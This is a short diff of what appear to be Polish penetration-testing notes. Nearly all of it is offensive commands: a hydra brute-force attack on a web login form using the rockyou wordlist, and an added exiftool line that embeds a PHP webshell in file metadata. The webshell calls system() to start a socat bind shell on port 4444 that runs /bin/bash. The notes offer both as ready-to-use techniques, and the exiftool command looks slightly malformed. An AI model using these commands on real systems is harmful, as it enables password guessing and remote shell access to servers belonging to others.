@@ -30,5 +30,7 @@ hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login:username=^USER^&
 
 
 Exiftool → modyfikacja metadanych (webshell w jpg)
+exiftool -Comment='<?php system("socat TCP-LISTEN:4444 EXEC:/bin/bash"); ?>' ob.php > evil.php
+
 
 
